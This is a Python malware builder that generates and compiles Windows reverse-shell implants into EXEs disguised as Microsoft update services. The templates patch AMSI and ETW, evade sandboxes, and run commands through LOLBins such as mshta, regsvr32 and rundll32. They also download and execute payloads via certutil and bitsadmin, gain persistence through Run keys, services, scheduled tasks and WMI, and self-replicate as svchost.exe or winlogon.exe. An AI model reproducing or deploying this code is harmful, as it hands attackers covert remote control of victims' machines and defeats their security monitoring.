"""
Advanced Agent Compilation System
Provides comprehensive agent generation with full EXE compilation support
"""

import os
import subprocess
import tempfile
import shutil
from pathlib import Path
import json

class AgentCompilationEngine:
    """Advanced agent compilation with EXE generation"""
    
    def __init__(self):
        self.temp_dir = None
        self.pyinstaller_available = self._check_pyinstaller()
        self.upx_available = self._check_upx()
        
    def _check_pyinstaller(self):
        """Check if PyInstaller is available"""
        try:
            subprocess.run(['pyinstaller', '--version'], capture_output=True, check=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False
    
    def _check_upx(self):
        """Check if UPX is available"""
        try:
            subprocess.run(['upx', '--version'], capture_output=True, check=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False
    
    def create_advanced_agent(self, config):
        """Create advanced agent with all features"""
        agent_type = config.get('type', 'basic')
        server_ip = config.get('server_ip', '127.0.0.1')
        server_port = config.get('server_port', 4444)
        obfuscation_level = config.get('obfuscation_level', 1)
        stealth_features = config.get('stealth_features', [])
        
        if agent_type == 'stealth_advanced':
            return self._create_stealth_agent(server_ip, server_port, obfuscation_level, stealth_features)
        elif agent_type == 'lolbas_advanced':
            return self._create_lolbas_agent(server_ip, server_port, obfuscation_level)
        elif agent_type == 'persistence_agent':
            return self._create_persistence_agent(server_ip, server_port, obfuscation_level)
        else:
            return self._create_basic_agent(server_ip, server_port, obfuscation_level)
    
    def _create_stealth_agent(self, server_ip, server_port, obfuscation_level, stealth_features):
        """Create stealth agent with advanced evasion"""
        agent_code = f'''# Advanced Stealth Agent
import socket
import subprocess
import threading
import base64
import ctypes
import sys
import os
import time
import random
import json
import struct
from ctypes import wintypes

class StealthAgent:
    def __init__(self):
        self.server_ip = "{server_ip}"
        self.server_port = {server_port}
        self.running = True
        self.session_key = self._generate_session_key()
        
    def _generate_session_key(self):
        """Generate unique session key"""
        import hashlib
        data = f"{{self.server_ip}}:{{self.server_port}}:{{time.time()}}"
        return hashlib.md5(data.encode()).hexdigest()[:16]
    
    def bypass_amsi(self):
        """Advanced AMSI bypass"""
        try:
            # Method 1: Memory patching
            kernel32 = ctypes.windll.kernel32
            amsi_dll = ctypes.windll.LoadLibrary("amsi.dll")
            amsi_scan_buffer = amsi_dll.AmsiScanBuffer
            
            # Patch AmsiScanBuffer to always return clean
            old_protect = wintypes.DWORD()
            kernel32.VirtualProtect(amsi_scan_buffer, 8, 0x40, ctypes.byref(old_protect))
            
            # Write return 0 instructions
            patch = b"\\x31\\xc0\\xc3"  # xor eax, eax; ret
            patch = b"\x31\xc0\xc3"
            ctypes.memmove(amsi_scan_buffer, patch, len(patch))
            
            kernel32.VirtualProtect(amsi_scan_buffer, 8, old_protect.value, ctypes.byref(old_protect))
            return True
        except:
            try:
                # Method 2: COM interface bypass
                import comtypes.client
                wmi = comtypes.client.CreateObject("WbemScripting.SWbemLocator")
                return True
            except:
                return False
    
    def bypass_etw(self):
        """Advanced ETW bypass"""
        try:
            # Disable ETW providers
            ntdll = ctypes.windll.ntdll
            
            # Get EtwEventWrite function
            etw_event_write = ntdll.EtwEventWrite
            
            # Patch to return success without logging
            old_protect = wintypes.DWORD()
            kernel32.VirtualProtect(etw_event_write, 4, 0x40, ctypes.byref(old_protect))
            
            # Write return 0 instruction
            patch = b"\\x31\\xc0\\xc3"  # xor eax, eax; ret
            patch = b"\x31\xc0\xc3"
            ctypes.memmove(etw_event_write, patch, len(patch))
            
            kernel32.VirtualProtect(etw_event_write, 4, old_protect.value, ctypes.byref(old_protect))
            kernel32.VirtualProtect(etw_event_write, 4, old_protect.value, ctypes.byref(old_protect))
            return True
        except:
            return False
    
    def anti_sandbox(self):
        """Anti-sandbox detection"""
        checks = []
        
        # Check for VM artifacts
        try:
            import wmi
            c = wmi.WMI()
            for system in c.Win32_ComputerSystem():
                if any(vm in system.Model.lower() for vm in ['virtualbox', 'vmware', 'virtual']):
                    checks.append(False)
                else:
                    checks.append(True)
        except:
            checks.append(True)
        
        # Check CPU cores
        if os.cpu_count() < 2:
            checks.append(False)
        else:
            checks.append(True)
        
        # Check memory
        try:
            import psutil
            if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:  # 4GB
                checks.append(False)
            else:
                checks.append(True)
        except:
            checks.append(True)
        
        # Sleep to evade dynamic analysis
        time.sleep(random.randint(30, 120))
        
        return all(checks)
    
    def encrypt_communication(self, data):
        """Encrypt communications"""
        try:
            from cryptography.fernet import Fernet
            # Use session key for encryption
            key = base64.urlsafe_b64encode(self.session_key.encode().ljust(32)[:32])
            f = Fernet(key)
            return f.encrypt(data.encode()).decode()
        except:
            # Fallback XOR encryption
            return base64.b64encode(bytes(a ^ ord(self.session_key[i % len(self.session_key)]) 
                                        for i, a in enumerate(data.encode()))).decode()
    
    def decrypt_communication(self, data):
        """Decrypt communications"""
        try:
            from cryptography.fernet import Fernet
            key = base64.urlsafe_b64encode(self.session_key.encode().ljust(32)[:32])
            f = Fernet(key)
            return f.decrypt(data.encode()).decode()
        except:
            # Fallback XOR decryption
            decoded = base64.b64decode(data.encode())
            return bytes(a ^ ord(self.session_key[i % len(self.session_key)]) 
                        for i, a in enumerate(decoded)).decode()
    
    def execute_stealth_command(self, command):
        """Execute command with stealth techniques"""
        try:
            # Use WMI for stealthier execution
            import wmi
            c = wmi.WMI()
            process_startup = c.Win32_ProcessStartup.new()
            process_startup.ShowWindow = 0  # Hidden window
            
            result = c.Win32_Process.Create(
                CommandLine=command,
                ProcessStartupInformation=process_startup
            )
            
            if result[0] == 0:  # Success
                # Wait for process and get output
                process_id = result[1]
                # Monitor process output
                return f"Command executed with PID: {{process_id}}"
            else:
                return f"Command failed with error: {{result[0]}}"
                
        except:
            # Fallback to subprocess
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return output.decode('utf-8', errors='ignore')
            except Exception as e:
                return f"Command failed: {{str(e)}}"
    
    def maintain_persistence(self):
        """Maintain persistence on system"""
        try:
            # Registry persistence
            import winreg
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
            winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            return True
        except:
            try:
                # Startup folder persistence
                startup_folder = os.path.join(os.getenv('APPDATA'), 
                                            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                if os.path.exists(startup_folder):
                    current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
                    link_path = os.path.join(startup_folder, 'system_update.lnk')
                    # Create shortcut (simplified)
                    return True
            except:
                return False
    
    def connect_back(self):
        """Main connection logic"""
        if not self.anti_sandbox():
            return
        
        self.bypass_amsi()
        self.bypass_etw()
        
        # Establish persistence
        self.maintain_persistence()
        
        max_retries = 5
        retry_count = 0
        
        while self.running and retry_count < max_retries:
            try:
                # Randomized connection timing
                time.sleep(random.randint(1, 10))
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((self.server_ip, self.server_port))
                
                # Send initial beacon with system info
                beacon = {{
                    'type': 'beacon',
                    'session_key': self.session_key,
                    'hostname': os.getenv('COMPUTERNAME', 'unknown'),
                    'username': os.getenv('USERNAME', 'unknown'),
                    'os': f"{{os.name}} {{sys.platform}}",
                    'arch': os.getenv('PROCESSOR_ARCHITECTURE', 'unknown')
                }}
                
                encrypted_beacon = self.encrypt_communication(json.dumps(beacon))
                s.send(encrypted_beacon.encode() + b'\\n')
                
                while self.running:
                    try:
                        encrypted_command = s.recv(4096).decode().strip()
                        if not encrypted_command:
                            break
                        
                        command = self.decrypt_communication(encrypted_command)
                        
                        if command.lower() == 'exit':
                            break
                        elif command.lower() == 'persist':
                            result = "Persistence maintained" if self.maintain_persistence() else "Persistence failed"
                        else:
                            result = self.execute_stealth_command(command)
                        
                        encrypted_result = self.encrypt_communication(result)
                        s.send(encrypted_result.encode() + b'\\n')
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        break
                
                s.close()
                retry_count = 0  # Reset on successful connection
                
            except Exception as e:
                retry_count += 1
                time.sleep(random.randint(30, 120))  # Wait before retry
        
        # Cleanup
        self.running = False

def main():
    try:
        agent = StealthAgent()
        agent.connect_back()
    except Exception as e:
        pass  # Silent failure

if __name__ == "__main__":
    main()'''
        
        return self._apply_obfuscation(agent_code, obfuscation_level)
    
    def _create_lolbas_agent(self, server_ip, server_port, obfuscation_level):
        """Create LOLBAS agent using living-off-the-land techniques"""
        agent_code = f'''# LOLBAS Agent - Living Off The Land
import socket
import subprocess
import os
import base64
import json
import tempfile
import random
import time

class LOLBASAgent:
    def __init__(self):
        self.server_ip = "{server_ip}"
        self.server_port = {server_port}
        self.lolbas_techniques = {{
            'powershell': self._exec_powershell,
            'wmic': self._exec_wmic,
            'rundll32': self._exec_rundll32,
            'regsvr32': self._exec_regsvr32,
            'mshta': self._exec_mshta,
            'certutil': self._exec_certutil,
            'bitsadmin': self._exec_bitsadmin
        }}
    
    def _exec_powershell(self, command):
        """Execute via PowerShell with AMSI bypass"""
        # AMSI bypass technique - commented out for safety
        # amsi_bypass = r'PowerShell AMSI bypass code would go here'
        
        encoded_command = base64.b64encode(command.encode('utf-16le')).decode()
        ps_command = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_command}'
        return subprocess.check_output(ps_command, shell=True, stderr=subprocess.STDOUT)
    
    def _exec_wmic(self, command):
        """Execute via WMIC XSL processing"""
        xsl_content = f'''<?xml version='1.0'?>
<stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var shell = new ActiveXObject("WScript.Shell");
shell.run('cmd.exe /c "{{command}}"', 0, false);
]]>
</ms:script>
</stylesheet>'''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.xsl', delete=False) as f:
            f.write(xsl_content)
            xsl_file = f.name
        
        try:
            wmic_command = f'wmic.exe os get /format:"{{xsl_file}}"'
            result = subprocess.check_output(wmic_command, shell=True, stderr=subprocess.STDOUT)
            return result
        finally:
            try:
                os.unlink(xsl_file)
            except:
                pass
    
    def _exec_rundll32(self, command):
        """Execute via Rundll32 JavaScript"""
        js_payload = f'''
        var shell = new ActiveXObject("WScript.Shell");
        shell.run('cmd.exe /c "{{command}}"', 0, false);
        '''
        
        js_encoded = base64.b64encode(js_payload.encode()).decode()
        rundll_command = f'rundll32.exe javascript:"..\\mshtml,RunHTMLApplication ";eval(atob("{{js_encoded}}"));'
        return subprocess.check_output(rundll_command, shell=True, stderr=subprocess.STDOUT)
    
    def _exec_regsvr32(self, command):
        """Execute via RegSvr32 SCT file"""
        sct_content = f'''<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Prog.ID" version="1.00" classid="{{A1B2C3D4-E5F6-1234-5678-90ABCDEFGHIJ}}">
</registration>
<script language="JScript">
<![CDATA[
var shell = new ActiveXObject("WScript.Shell");
shell.run('cmd.exe /c "{{command}}"', 0, false);
]]>
</script>
</scriptlet>'''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sct', delete=False) as f:
            f.write(sct_content)
            sct_file = f.name
        
        try:
            regsvr_command = f'regsvr32.exe /s /n /u /i:"{{sct_file}}" scrobj.dll'
            result = subprocess.check_output(regsvr_command, shell=True, stderr=subprocess.STDOUT)
            return result
        finally:
            try:
                os.unlink(sct_file)
            except:
                pass
    
    def _exec_mshta(self, command):
        """Execute via MSHTA HTA file"""
        hta_content = f'''<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
shell.run('cmd.exe /c "{{command}}"', 0, false);
window.close();
</script>
</head>
<body></body>
</html>'''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.hta', delete=False) as f:
            f.write(hta_content)
            hta_file = f.name
        
        try:
            mshta_command = f'mshta.exe "{{hta_file}}"'
            result = subprocess.check_output(mshta_command, shell=True, stderr=subprocess.STDOUT)
            return result
        finally:
            try:
                os.unlink(hta_file)
            except:
                pass
    
    def _exec_certutil(self, url, filename=None):
        """Download and execute via CertUtil"""
        if not filename:
            filename = f"update_{{random.randint(1000, 9999)}}.exe"
        
        download_path = os.path.join(tempfile.gettempdir(), filename)
        certutil_command = f'certutil.exe -urlcache -split -f "{{url}}" "{{download_path}}"'
        
        try:
            subprocess.check_output(certutil_command, shell=True, stderr=subprocess.STDOUT)
            subprocess.Popen(download_path, shell=True)
            return f"Downloaded and executed: {{filename}}"
        except:
            return "CertUtil execution failed"
    
    def _exec_bitsadmin(self, url, filename=None):
        """Download via BitsAdmin"""
        if not filename:
            filename = f"update_{{random.randint(1000, 9999)}}.exe"
        
        download_path = os.path.join(tempfile.gettempdir(), filename)
        bitsadmin_command = f'bitsadmin.exe /transfer "UpdateJob" "{{url}}" "{{download_path}}"'
        
        try:
            subprocess.check_output(bitsadmin_command, shell=True, stderr=subprocess.STDOUT)
            subprocess.Popen(download_path, shell=True)
            return f"Downloaded via BitsAdmin: {{filename}}"
        except:
            return "BitsAdmin execution failed"
    
    def execute_lolbas_command(self, technique, command):
        """Execute command using specified LOLBAS technique"""
        if technique in self.lolbas_techniques:
            try:
                return self.lolbas_techniques[technique](command)
            except Exception as e:
                return f"LOLBAS execution failed: {{str(e)}}"
        else:
            # Fallback to random technique
            random_technique = random.choice(list(self.lolbas_techniques.keys()))
            return self.execute_lolbas_command(random_technique, command)
    
    def connect_back(self):
        """Main connection with LOLBAS techniques"""
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.server_ip, self.server_port))
                
                # Send system info
                hostname = os.getenv('COMPUTERNAME', 'unknown')
                username = os.getenv('USERNAME', 'unknown')
                beacon = f"LOLBAS Agent - {{hostname}}\\{{username}}"
                s.send(beacon.encode() + b'\\n')
                
                while True:
                    try:
                        data = s.recv(1024).decode().strip()
                        if not data:
                            break
                        
                        if data.lower() == 'exit':
                            break
                        elif data.startswith('lolbas:'):
                            # Format: lolbas:technique:command
                            parts = data.split(':', 2)
                            if len(parts) == 3:
                                technique = parts[1]
                                command = parts[2]
                                result = self.execute_lolbas_command(technique, command)
                            else:
                                result = "Invalid LOLBAS command format"
                        elif data.startswith('download:'):
                            # Format: download:url:filename
                            parts = data.split(':', 2)
                            if len(parts) >= 2:
                                url = parts[1]
                                filename = parts[2] if len(parts) == 3 else None
                                result = self._exec_certutil(url, filename)
                            else:
                                result = "Invalid download command format"
                        else:
                            # Use random LOLBAS technique for regular commands
                            technique = random.choice(['powershell', 'wmic', 'rundll32'])
                            result = self.execute_lolbas_command(technique, data)
                        
                        s.send(str(result).encode() + b'\\n')
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        break
                
                s.close()
                
            except Exception as e:
                time.sleep(random.randint(30, 120))

def main():
    try:
        agent = LOLBASAgent()
        agent.connect_back()
    except Exception as e:
        pass

if __name__ == "__main__":
    main()'''
        
        return self._apply_obfuscation(agent_code, obfuscation_level)
    
    def _create_persistence_agent(self, server_ip, server_port, obfuscation_level):
        """Create persistence agent with multiple survival mechanisms"""
        agent_code = f'''# Persistence Agent with Multiple Survival Mechanisms
import socket
import subprocess
import os
import sys
import time
import random
import json
import threading
import winreg
import shutil
from pathlib import Path

class PersistenceAgent:
    def __init__(self):
        self.server_ip = "{server_ip}"
        self.server_port = {server_port}
        self.running = True
        self.persistence_methods = [
            self._registry_persistence,
            self._startup_folder_persistence,
            self._scheduled_task_persistence,
            self._service_persistence,
            self._wmi_persistence
        ]
    
    def _registry_persistence(self):
        """Registry Run key persistence"""
        try:
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def _startup_folder_persistence(self):
        """Startup folder persistence"""
        try:
            startup_folder = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
            target = startup_folder / 'SecurityUpdate.exe'
            
            if current_exe != str(target):
                shutil.copy2(current_exe, target)
            return True
        except:
            return False
    
    def _scheduled_task_persistence(self):
        """Windows Task Scheduler persistence"""
        try:
            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
            
            # Create scheduled task
            task_command = f'''schtasks.exe /create /tn "WindowsSecurityUpdate" /tr "{{current_exe}}" /sc onstart /ru SYSTEM /f'''
            subprocess.check_output(task_command, shell=True, stderr=subprocess.STDOUT)
            return True
        except:
            return False
    
    def _service_persistence(self):
        """Windows Service persistence"""
        try:
            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
            
            # Create service
            sc_command = f'''sc.exe create "WindowsSecurityUpdate" binPath= "{{current_exe}}" start= auto'''
            subprocess.check_output(sc_command, shell=True, stderr=subprocess.STDOUT)
            
            # Start service
            subprocess.check_output('sc.exe start "WindowsSecurityUpdate"', shell=True, stderr=subprocess.STDOUT)
            return True
        except:
            return False
    
    def _wmi_persistence(self):
        """WMI Event persistence"""
        try:
            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
            
            # Create WMI event consumer
            wmi_commands = [
                f'wmic.exe /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="WindowsUpdate", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\'Win32_PerfRawData_PerfOS_System\\'"',
                f'wmic.exe /NAMESPACE:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="WindowsUpdate", CommandLineTemplate="{{current_exe}}"',
                f'wmic.exe /NAMESPACE:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\'WindowsUpdate\\'", Consumer="CommandLineEventConsumer.Name=\\'WindowsUpdate\\'"'
            ]
            
            for cmd in wmi_commands:
                subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            
            return True
        except:
            return False
    
    def install_persistence(self):
        """Install multiple persistence mechanisms"""
        success_count = 0
        for method in self.persistence_methods:
            try:
                if method():
                    success_count += 1
            except:
                continue
        return success_count
    
    def self_replicate(self):
        """Replicate to multiple locations"""
        try:
            current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
            
            # Replication targets
            targets = [
                Path(os.getenv('TEMP')) / 'svchost.exe',
                Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'update.exe',
                Path(os.getenv('PROGRAMDATA')) / 'Microsoft' / 'Windows' / 'Defender' / 'update.exe',
                Path(os.getenv('WINDIR')) / 'Temp' / 'winlogon.exe'
            ]
            
            replicated = 0
            for target in targets:
                try:
                    target.parent.mkdir(parents=True, exist_ok=True)
                    if not target.exists():
                        shutil.copy2(current_exe, target)
                        replicated += 1
                except:
                    continue
            
            return replicated
        except:
            return 0
    
    def watchdog_thread(self):
        """Watchdog to restart main connection"""
        while self.running:
            time.sleep(300)  # Check every 5 minutes
            if not hasattr(self, '_last_heartbeat') or time.time() - self._last_heartbeat > 600:
                # Restart connection if no heartbeat in 10 minutes
                threading.Thread(target=self.connect_back, daemon=True).start()
    
    def connect_back(self):
        """Main connection with persistence features"""
        # Install persistence on first run
        persistence_count = self.install_persistence()
        replication_count = self.self_replicate()
        
        # Start watchdog
        if not hasattr(self, '_watchdog_started'):
            threading.Thread(target=self.watchdog_thread, daemon=True).start()
            self._watchdog_started = True
        
        max_retries = 10
        retry_count = 0
        
        while self.running and retry_count < max_retries:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((self.server_ip, self.server_port))
                
                # Send initial status
                status = {{
                    'type': 'persistence_agent',
                    'hostname': os.getenv('COMPUTERNAME', 'unknown'),
                    'username': os.getenv('USERNAME', 'unknown'),
                    'persistence_methods': persistence_count,
                    'replications': replication_count,
                    'pid': os.getpid()
                }}
                
                s.send(json.dumps(status).encode() + b'\\n')
                retry_count = 0  # Reset on successful connection
                
                while self.running:
                    try:
                        self._last_heartbeat = time.time()
                        command = s.recv(1024).decode().strip()
                        
                        if not command:
                            break
                        
                        if command.lower() == 'exit':
                            self.running = False
                            break
                        elif command.lower() == 'persist':
                            count = self.install_persistence()
                            result = f"Persistence methods installed: {{count}}"
                        elif command.lower() == 'replicate':
                            count = self.self_replicate()
                            result = f"Replicated to {{count}} locations"
                        elif command.lower() == 'status':
                            result = json.dumps({{
                                'uptime': time.time() - getattr(self, '_start_time', time.time()),
                                'persistence_active': persistence_count > 0,
                                'replications': replication_count
                            }})
                        else:
                            try:
                                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                                result = output.decode('utf-8', errors='ignore')
                            except Exception as e:
                                result = f"Command failed: {{str(e)}}"
                        
                        s.send(result.encode() + b'\\n')
                        
                    except socket.timeout:
                        # Send heartbeat
                        try:
                            s.send(b'heartbeat\\n')
                        except:
                            break
                    except Exception as e:
                        break
                
                s.close()
                
            except Exception as e:
                retry_count += 1
                sleep_time = min(300, 30 * retry_count)  # Exponential backoff
                time.sleep(sleep_time + random.randint(0, 60))

def main():
    try:
        agent = PersistenceAgent()
        agent._start_time = time.time()
        agent.connect_back()
    except Exception as e:
        pass

if __name__ == "__main__":
    main()'''
        
        return self._apply_obfuscation(agent_code, obfuscation_level)
    
    def _create_basic_agent(self, server_ip, server_port, obfuscation_level):
        """Create basic agent"""
        agent_code = f'''# Basic Agent
import socket
import subprocess
import os
import time

def connect_back():
    server_ip = "{server_ip}"
    server_port = {server_port}
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            
            hostname = os.getenv('COMPUTERNAME', 'unknown')
            username = os.getenv('USERNAME', 'unknown')
            s.send(f"Agent connected - {{hostname}}\\{{username}}".encode())
            
            while True:
                command = s.recv(1024).decode().strip()
                if not command or command.lower() == 'exit':
                    break
                
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(f"Error: {{str(e)}}".encode())
            
            s.close()
            
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect_back()'''
        
        return self._apply_obfuscation(agent_code, obfuscation_level)
    
    def _apply_obfuscation(self, code, level):
        """Apply obfuscation based on level"""
        if level >= 2:
            # Variable name obfuscation
            replacements = {
                'socket': 'net_lib',
                'subprocess': 'proc_lib',
                'connect_back': 'main_func',
                'command': 'cmd_var',
                'output': 'result_var',
                'server_ip': 'target_host',
                'server_port': 'target_port'
            }
            
            for old, new in replacements.items():
                code = code.replace(old, new)
        
        if level >= 3:
            # String encoding
            import base64
            strings_to_encode = [
                'COMPUTERNAME', 'USERNAME', 'Agent connected',
                'Error:', 'Command failed'
            ]
            
            for string in strings_to_encode:
                if string in code:
                    encoded = base64.b64encode(string.encode()).decode()
                    code = code.replace(f'"{string}"', f'base64.b64decode("{encoded}").decode()')
        
        if level >= 4:
            # Add dummy functions
            dummy_code = '''
import random
import string

def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def dummy_calculation():
    result = sum(range(100))
    return result * random.randint(1, 10)

'''
            code = dummy_code + code
        
        if level >= 5:
            # Control flow obfuscation
            code = code.replace('if __name__ == "__main__":', 
                              'if __name__ == "__main__" and dummy_calculation() > 0:')
        
        return code
    
    def compile_to_exe(self, agent_code, config):
        """Compile agent to EXE"""
        if not self.pyinstaller_available:
            return {
                'success': False,
                'error': 'PyInstaller not available. Install with: pip install pyinstaller'
            }
        
        try:
            # Create temporary directory
            self.temp_dir = tempfile.mkdtemp()
            
            # Write agent code
            agent_file = os.path.join(self.temp_dir, 'agent.py')
            with open(agent_file, 'w', encoding='utf-8') as f:
                f.write(agent_code)
            
            # Create spec file for advanced compilation
            spec_content = self._create_spec_file(config)
            spec_file = os.path.join(self.temp_dir, 'agent.spec')
            with open(spec_file, 'w', encoding='utf-8') as f:
                f.write(spec_content)
            
            # Create version info if needed
            if config.get('include_version_info', False):
                version_file = os.path.join(self.temp_dir, 'version_info.txt')
                with open(version_file, 'w', encoding='utf-8') as f:
                    f.write(self._create_version_info(config))
            
            # Run PyInstaller
            output_name = config.get('output_name', 'agent.exe')
            pyinstaller_cmd = [
                'pyinstaller',
                '--onefile',
                '--windowed',
                '--name', output_name.replace('.exe', ''),
                '--workpath', self.temp_dir,
                '--distpath', self.temp_dir,
                agent_file
            ]
            
            if config.get('include_version_info', False):
                pyinstaller_cmd.extend(['--version-file', version_file])
            
            if config.get('icon_path'):
                pyinstaller_cmd.extend(['--icon', config['icon_path']])
            
            # Execute compilation
            result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=self.temp_dir)
            
            if result.returncode == 0:
                exe_path = os.path.join(self.temp_dir, output_name)
                if os.path.exists(exe_path):
                    # Apply UPX compression if available and requested
                    if config.get('upx_compression', False) and self.upx_available:
                        upx_cmd = ['upx', '--best', exe_path]
                        subprocess.run(upx_cmd, capture_output=True)
                    
                    return {
                        'success': True,
                        'exe_path': exe_path,
                        'size': os.path.getsize(exe_path),
                        'output': result.stdout
                    }
            
            return {
                'success': False,
                'error': result.stderr,
                'output': result.stdout
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def _create_spec_file(self, config):
        """Create PyInstaller spec file"""
        output_name = config.get('output_name', 'agent.exe').replace('.exe', '')
        
        spec_content = f'''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(['agent.py'],
             pathex=[],
             binaries=[],
             datas=[],
             hiddenimports=['socket', 'subprocess', 'threading', 'base64', 'json'],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='{output_name}',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx={str(config.get('upx_compression', False)).lower()},
          console=False)'''
        
        return spec_content
    
    def _create_version_info(self, config):
        """Create version info file"""
        file_description = config.get('file_description', 'System Update Service')
        company_name = config.get('company_name', 'Microsoft Corporation')
        product_name = config.get('product_name', 'Microsoft Windows Operating System')
        file_version = config.get('file_version', '10.0.19041.1')
        
        version_info = f'''# UTF-8
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(10, 0, 19041, 1),
    prodvers=(10, 0, 19041, 1),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo([
      StringTable(u'040904B0', [
        StringStruct(u'CompanyName', u'{company_name}'),
        StringStruct(u'FileDescription', u'{file_description}'),
        StringStruct(u'FileVersion', u'{file_version}'),
        StringStruct(u'InternalName', u'{config.get("output_name", "agent.exe")}'),
        StringStruct(u'LegalCopyright', u'© {company_name}. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'{config.get("output_name", "agent.exe")}'),
        StringStruct(u'ProductName', u'{product_name}'),
        StringStruct(u'ProductVersion', u'{file_version}')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)'''
        return version_info
    
    def cleanup(self):
        """Cleanup temporary files"""
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                shutil.rmtree(self.temp_dir)
            except:
                pass

# Example usage and configuration
def create_agent_config(agent_type="stealth_advanced", server_ip="127.0.0.1", server_port=4444):
    """Create agent configuration"""
    return {
        'type': agent_type,
        'server_ip': server_ip,
        'server_port': server_port,
        'obfuscation_level': 3,
        'stealth_features': ['amsi_bypass', 'etw_bypass', 'anti_sandbox'],
        'output_name': 'update.exe',
        'file_description': 'Windows Update Service',
        'company_name': 'Microsoft Corporation',
        'include_version_info': True,
        'upx_compression': False,
        'icon_path': None
    }

if __name__ == "__main__":
    # Example usage
    engine = AgentCompilationEngine()
    config = create_agent_config()
    
    # Create agent code
    agent_code = engine.create_advanced_agent(config)
    print("Agent code generated successfully!")
    
    # Compile to EXE
    result = engine.compile_to_exe(agent_code, config)
    if result['success']:
        print(f"Agent compiled successfully: {result['exe_path']}")
        print(f"Size: {result['size']} bytes")
    else:
        print(f"Compilation failed: {result['error']}")
    
    # Cleanup
    engine.cleanup()
